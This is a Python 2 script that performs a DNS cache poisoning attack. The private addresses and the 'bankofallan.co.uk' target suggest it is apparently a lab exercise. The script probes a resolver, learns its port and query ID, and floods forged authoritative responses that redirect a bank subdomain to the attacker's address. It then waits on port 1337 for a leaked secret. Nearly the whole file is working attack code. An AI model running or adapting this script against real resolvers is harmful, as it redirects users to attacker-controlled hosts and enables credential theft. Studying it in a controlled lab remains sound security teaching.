import socket
import threading
from dnslib import *
from scapy.all import *
import time

# global variable, can be edited to make the attack in specific environment
LOCAL_IP = "10.0.5.6"
TARGET_IP ="10.0.5.5"
NS_IP="10.0.0.1"
ATTACKER_DOMAIN="badguy.ru"
SUB_DOMAIN="a.b.c.bankofallan.co.uk"

#global variable, these cannot be editet, this variable will be initialized
#properly by the script
DEST_PORT = 0
QUERY_ID = 0
answers = []


def sniff():
	print "Gathering information about port and qid"
	sok = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sok.bind((LOCAL_IP,53))
	data, addr = sok.recvfrom(4096)
	pkt = DNSRecord.parse(data)
	global DEST_PORT
	DEST_PORT = addr[1]
	global QUERY_ID 
	QUERY_ID = pkt.header.id
	sok.close()


def sendRequestForDomain(domain):
	request = ( IP(src = LOCAL_IP, dst=TARGET_IP)/UDP(sport=10000, dport=53)/DNS(id = 111, rd = 1, qr =0, z = 0, qdcount = 1, qd =  DNSRR(rrname = domain, type = "A", rclass="IN")) )
	send(request, verbose = 0)

def createDnsAnswer(domain):
	global answer
	print "Creating dns fake answer"
	for x in range(1,100):
		answer = DNSRecord(DNSHeader(id = QUERY_ID + x, qr=1,aa=1,ra=1), q=DNSQuestion(domain), a=RR(domain, rdata=A(NS_IP)))
		answer.add_ar(RR(domain, rdata= A(LOCAL_IP)))
		answers.append(bytes(answer.pack()))

def sendPacket(sock):
	print "Sending request for subdomain"
	sendRequestForDomain('a.b.c.bankofallan.co.uk')
	print "start sending fake response"
	for x in answers:
		sock.sendto(x, (TARGET_IP,DEST_PORT))

def sniffsecret():
	skt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	skt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	skt.bind(("0.0.0.0", 1337))
	print "start sniffing the secert"
	data , addr = skt.recvfrom(8192)
	print "The attack worked, the secret is"
	print data
	skt.close()

for x in range(1,11):
	sendRequestForDomain(ATTACKER_DOMAIN)

try:
	sniffer = threading.Thread(target = sniff)
	sniffer.start()
except:
	print "Cannot create sniffer thread"

try:
	secret = threading.Thread(target = sniffsecret)
	secret.start()
except:
	print "Cannot create sniffsecret thread"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((NS_IP,53))
sendRequestForDomain(ATTACKER_DOMAIN)
createDnsAnswer(SUB_DOMAIN)
sendPacket(sock)
print "End of attack"